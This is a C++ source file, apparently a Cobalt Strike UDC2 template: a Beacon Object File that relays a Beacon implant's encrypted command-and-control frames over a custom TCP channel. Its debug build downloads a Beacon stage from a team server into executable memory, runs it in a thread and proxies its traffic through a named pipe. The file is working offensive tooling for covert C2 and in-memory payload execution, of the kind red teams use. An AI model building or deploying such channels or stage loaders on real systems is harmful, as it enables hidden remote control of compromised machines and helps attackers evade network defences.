#include <Windows.h>
#include "base\helpers.h"
#include "udc2.h"

/**
 * For the debug build we want:
 *   a) Undefine DECLSPEC_IMPORT 
 */
#ifdef _DEBUG
#undef DECLSPEC_IMPORT
#define DECLSPEC_IMPORT
#include <string>
#pragma comment(lib, "ws2_32.lib")
#endif

extern "C" {

    // Define our Dynamic Function Resolution declarations
    DFR(WS2_32, WSAStartup);
    DFR(WS2_32, WSACleanup);
    DFR(WS2_32, inet_addr);
    DFR(WS2_32, htons);
    DFR(WS2_32, connect);
    DFR(WS2_32, socket);
    DFR(WS2_32, closesocket);
    DFR(WS2_32, send);
    DFR(WS2_32, recv);

    #define WSAStartup WS2_32$WSAStartup
    #define WSACleanup WS2_32$WSACleanup
    #define inet_addr WS2_32$inet_addr
    #define htons WS2_32$htons
    #define connect WS2_32$connect
    #define socket WS2_32$socket
    #define closesocket WS2_32$closesocket
    #define send WS2_32$send
    #define recv WS2_32$recv

    #define FRAME_LENGTH 4
    LPCSTR gUDC2Server = "127.0.0.1"; // SET THIS TO THE BIND ADDRESS OF THE UDC2 TCP SERVER PYTHON SCRIPT
    USHORT gUDC2ServerPort = 3333; // SET THIS TO THE BIND PORT OF THE UDC2 TCP SERVER PYTHON SCRIPT
    SOCKET gSocket = INVALID_SOCKET;

    /**
     * @brief Beacon calls this function to send/receive encrypted frame data
     * via the UDC2 channel. The sendBuf parameter points to the outgoing frame
     * data and the recvBuf parameter expects to receive the response. This is in 
     * effect a proxy function as it intercepts the outbound and inbound frame 
     * data.
     * 
     * Note: 
     *     - Send the sendBuf data to the UDC2 server
     *     - Copy the relayed response frame into recvBuf
     *     - Return the total number of bytes copied to recvBuf
     *     - Return -1 to indicate an error condition
     *     - A return value of -1 or 0 causes Beacon to reset the session    
     *
     *
     * @param sendBuf Points to Beacon frame data that needs to be sent out
     * @param sendBufLen The total length of the frame data
     * @param recvBuf Points to Beacon memory that you should copy response frame data to
     * @param recvBufMaxLen The max size of the recv buffer. Do not copy data past this length.
     * Note that this size can be controlled by the tasks_max_size malleable c2 profile setting. It
     * defaults to 1 MB.
     * @return The total number of bytes copied to recvBuf or -1 on any failure
     */
    int udc2Proxy(const char* sendBuf, int sendBufLen, char* recvBuf, int recvBufMaxLen) {
        int bytesSent = 0;
        int bytesToReceive = 0;
        int bytesCopied = 0;

        /** 
        * Send out our frame. Beacon always provides us a complete frame in sendBuf. 
        * The structure in sendBuf is -> | 4-byte frame data length | frame data |
        */
        while (bytesSent < sendBufLen) {
            int result = send(gSocket, sendBuf + bytesSent, sendBufLen - bytesSent, 0);
            if (result <= 0)
                return SOCKET_ERROR;
            bytesSent += result;
        }

        /** 
        * We'll read the frame length into the recv buffer first so we know how much
        * more data we need to receive, and then we'll complete the frame by reading 
        * in the rest of the data. The data that goes into recvBuf must look like 
        * -> | 4-byte frame data length | frame data |
        * 
        * NOTE: The frame length value must always be written in little endian.
        */
        int frameLen = recv(gSocket, recvBuf, FRAME_LENGTH, 0);
        if (frameLen <= 0)
            return SOCKET_ERROR;

        /* don't receive more than we have space for */
        bytesToReceive = *(int*)recvBuf;
        if (bytesToReceive + FRAME_LENGTH > recvBufMaxLen)
            return SOCKET_ERROR;

        /* receive the rest of the data into the read buffer */
        while (bytesCopied < bytesToReceive) {
            int result = recv(gSocket, recvBuf + FRAME_LENGTH + bytesCopied, bytesToReceive - bytesCopied, 0);
            if (result <= 0)
                return SOCKET_ERROR;
            bytesCopied += result;
        }

        /* here we have to account for the 4-byte frame length we wrote first, plus the frame data */
        return bytesCopied + FRAME_LENGTH;
    }

    /**
     * @brief Called by Beacon when closing the UDC2 channel. This should be used for any cleanup 
     * you may need to perform.
     */
    void udc2Close() {
        closesocket(gSocket);
        WSACleanup();
    }

    /**
     * @brief Example function to perform any local initialization tasks for your UDC2 BOF
     */
    int init() {
        struct sockaddr_in sock;
        WORD wVersionRequested;
        WSADATA wsaData;
        int result;

        /* init winsock */
        wVersionRequested = MAKEWORD(2, 2);
        result = WSAStartup(wVersionRequested, &wsaData);
        if (result != 0)
            return SOCKET_ERROR;
        
        /* set up a TCP socket to connect to our UDC2 server */
        sock.sin_family = AF_INET;
        sock.sin_addr.s_addr = inet_addr(gUDC2Server);
        sock.sin_port = htons(gUDC2ServerPort);
        gSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (gSocket == INVALID_SOCKET) {
            WSACleanup();
            return SOCKET_ERROR;
        }

        /** 
        * NOTE: Here you might choose to set some socket options such as a timeout
        * so that Beacon doesn't just sit unmasked in the event your connect, send, 
        * or recv hangs.
        */

        /* connect to our UDC2 server */
        if (connect(gSocket, (struct sockaddr*)&sock, sizeof(sock))) {
            closesocket(gSocket);
            WSACleanup();
            return SOCKET_ERROR;
        }

        return ERROR_SUCCESS;
    }

    /**
     * @brief The UDC2 BOF entry point. Beacon calls this function to initialize the 
     * UDC2 BOF and passes a pointer to a UDC2_INFO structure as the args parameter. 
     * You must populate the struct members with your udc2Proxy and udc2Close functions, 
     * otherwise Beacon will assume an error has occurred and exit. This is where any 
     * initialization you need for your UDC2 channel should occur.
     * 
     * @param args Pointer to a UDC2_INFO structure
     * @param len Length of the args buffer
     */
    void go(char* args, int len) {
        PUDC2_INFO funcs = (PUDC2_INFO)args;

        if (ERROR_SUCCESS == init()) {
            funcs->proxyCall = udc2Proxy;
            funcs->proxyClose = udc2Close;
            funcs->version = 0x041200;
        }
    }
}

// Define a main function for the debug build
#if defined(_DEBUG)

#define PAYLOAD_MAX_SIZE 512 * 1024
/**
* BUFFER_MAX_SIZE mocks the tasks_max_size malleable c2 profile setting. It
* is passed as the frameBufferMaxLen value to your udc2 proxy function.
* NOTE: If you change the tasks_max_size to something other than the 
* default (which is 1 MB), you should also change BUFFER_MAX_SIZE to match
* it when testing code.
*/
#define BUFFER_MAX_SIZE 1024 * 1024

// read a frame from a file
DWORD readFrame(HANDLE myHandle, char* buffer, DWORD max) {
    DWORD size = 0, temp = 0, total = 0;

    // read the 4-byte length
    ReadFile(myHandle, (char*)&size, 4, &temp, NULL);

    // read the whole thing in
    while (total < size) {
        ReadFile(myHandle, buffer + total, size - total, &temp, NULL);
        total += temp;
    }

    return size;
}

// receive a frame from a socket
DWORD recvFrame(SOCKET mySocket, char* buffer, DWORD max) {
    DWORD size = 0, total = 0, temp = 0;

    // read the 4-byte length
    recv(mySocket, (char*)&size, 4, 0);

    // read in the result
    while (total < size) {
        temp = recv(mySocket, buffer + total, size - total, 0);
        total += temp;
    }

    return size;
}

// send a frame via a socket
void sendFrame(SOCKET mySocket, char* buffer, int length) {
    send(mySocket, (char*)&length, 4, 0);
    send(mySocket, buffer, length, 0);
}

// write a frame to a file
void writeFrame(HANDLE myHandle, char* buffer, DWORD length) {
    DWORD wrote = 0;
    WriteFile(myHandle, (void*)&length, 4, &wrote, NULL);
    WriteFile(myHandle, buffer, length, &wrote, NULL);
}

/*******************************************************************
 * @brief This function retrieves a Beacon payload and injects it into
 * the current process. This allows the Debug Beacon to mock how the UDC2
 * Beacon functions.
 * 
 * NOTE: This is for Debug purposes only and is not intended to
 * replace the need for a UDC2 server. Also be aware that the debug
 * session does not honor any sleep malleable c2 profile settings as
 * it uses an SMB Beacon payload which does not support sleep. This
 * will make the debug session in effect interactive, however when
 * using your Release BOF, the sleep malleable c2 profile settings 
 * will be honored.
 * 
 * 1. Set up a UDC2 listener (select debug-only)
 * 2. Update the UDC2_DEBUG_HOST and UDC2_DEBUG_PORT variables
 * 3. Start the example UDC2 server
 * 4. Select "Local Windows Debugger"
********************************************************************/
int main(int argc, char* argv[]) {
    struct sockaddr_in 	sock;
    UDC2_INFO           udc2Info = { 0 };
    WSADATA             wsaData;
    WORD                wVersionRequested;
    LPCSTR              UDC2_DEBUG_HOST = "127.0.0.1"; // SET THIS TO YOUR UDC2 LISTENER HOST (Team Server)
    USHORT              UDC2_DEBUG_PORT = 2222; // SET THIS TO YOUR UDC2 LISTENER PORT

    wVersionRequested = MAKEWORD(2, 2);
    sock.sin_family = AF_INET;
    sock.sin_addr.s_addr = inet_addr(UDC2_DEBUG_HOST);
    sock.sin_port = htons(UDC2_DEBUG_PORT);

    // initialize the udc2 bof
    go((char*)&udc2Info, 0);

    if (!udc2Info.proxyCall || !udc2Info.proxyClose) {
        printf("UDC2 functions not initialized properly.\n");
        return -1;
    }

    WSAStartup(wVersionRequested, &wsaData);

    // attempt to connect to udc2 listener
    SOCKET socketUDC2 = socket(AF_INET, SOCK_STREAM, 0);
    if (connect(socketUDC2, (struct sockaddr*)&sock, sizeof(sock))) {
        printf(
            "Could not connect to %s:%d. Make sure you have a UDC2 debug-only listener set up.\n", 
            UDC2_DEBUG_HOST, 
            UDC2_DEBUG_PORT
        );
        exit(0);
    }

    /**
    * Grab the correct smb Beacon for our arch.
    * 
    * NOTE: arch, block, pipename, and debugpayload 
    * commands are only available to debug-only udc2
    * listeners and only intended for use by this 
    * VS project.
    */
#ifdef _M_X64
    sendFrame(socketUDC2, (char*)"arch=x64", 8);
#else
    sendFrame(socketUDC2, (char*)"arch=x86", 8);
#endif
    sendFrame(socketUDC2, (char*)"block=100", 9);
    sendFrame(socketUDC2, (char*)"pipename=udc2_debug", 19);

    // request our stage
    sendFrame(socketUDC2, (char*)"debugpayload", 12);

    // receive our stage
    char* payload = (char*)VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    recvFrame(socketUDC2, payload, PAYLOAD_MAX_SIZE);

    closesocket(socketUDC2);

    // execute the payload stage in the current process
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)payload, (LPVOID)NULL, 0, NULL);

    // connect to our Beacon named pipe
    HANDLE handleBeacon = INVALID_HANDLE_VALUE;
    while (handleBeacon == INVALID_HANDLE_VALUE) {
        Sleep(1000);
        handleBeacon = CreateFileA("\\\\.\\pipe\\udc2_debug", GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
    }

    // setup our buffers
    char* buffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do
    char* readBuffer = (char*)malloc(BUFFER_MAX_SIZE); // 1MB should do

    // relay frames back and forth
    while (TRUE) {
        // if Beacon exits, bail
        DWORD waitRes = WaitForSingleObject(hThread, 0);
        if (waitRes == WAIT_OBJECT_0) 
            break;
         
        // read from our named pipe Beacon
        DWORD read = readFrame(handleBeacon, buffer, BUFFER_MAX_SIZE);
        if (read < 0) {
            break;
        }

        // rebuild the frame so it starts with the frame length
        char* out = (char*)malloc(read + 4);
        memcpy(out, &read, sizeof(int));
        memcpy(out + sizeof(int), buffer, read);

        // invoke our udc2 proxy to relay the data and recv the response
        read = udc2Info.proxyCall(out, sizeof(int) + read, readBuffer, BUFFER_MAX_SIZE);
        free(out);
        if (read < 0)
            break;

        // write to our named pipe Beacon, adjusting for frame length since
        // the proxy call returns the full frame data from the UDC2 server
        writeFrame(handleBeacon, readBuffer + sizeof(int), read - sizeof(int));
    }

    udc2Info.proxyClose();
    // close our handles
    CloseHandle(handleBeacon);
    CloseHandle(hThread);
    free(readBuffer);
    free(buffer);
    VirtualFree(payload, 0, MEM_RELEASE);

    return 0;
}

#endif
